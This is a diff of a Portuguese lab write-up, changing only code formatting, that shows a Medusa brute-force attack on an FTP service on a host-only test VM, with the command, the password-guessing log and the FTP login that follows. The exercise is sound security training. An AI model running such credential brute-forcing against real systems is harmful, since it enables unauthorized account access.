@@ -18,7 +18,7 @@ Utilizar a placa de rede como (Placa de rede exclusiva de hospedeiro), para os s
   Iniciando o ataque com o comando - `medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6`
 como resultado obtive a seguinte resposta.
 
-`Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+```Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
 2025-11-27 22:58:25 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 1 complete) Password: msfadmin (1 of 4 complete)
 
@@ -45,12 +45,12 @@ como resultado obtive a seguinte resposta.
 2025-11-27 22:58:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: querty (3 of 4 complete)
 
 2025-11-27 22:58:33 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: msfadmin (4 of 4 complete)
-`
+```
 
 Deixei marcado a senha que foi obtida.
 Agora só abrir o sistema FTP da máquina testada para verificar.
 
-`ftp 192.168.56.103
+```ftp 192.168.56.103
 
 Connected to 192.168.56.103.
 
@@ -68,4 +68,4 @@ Remote system type is UNIX.
 
 Using binary mode to transfer files.
 
-ftp> `
+ftp> ```
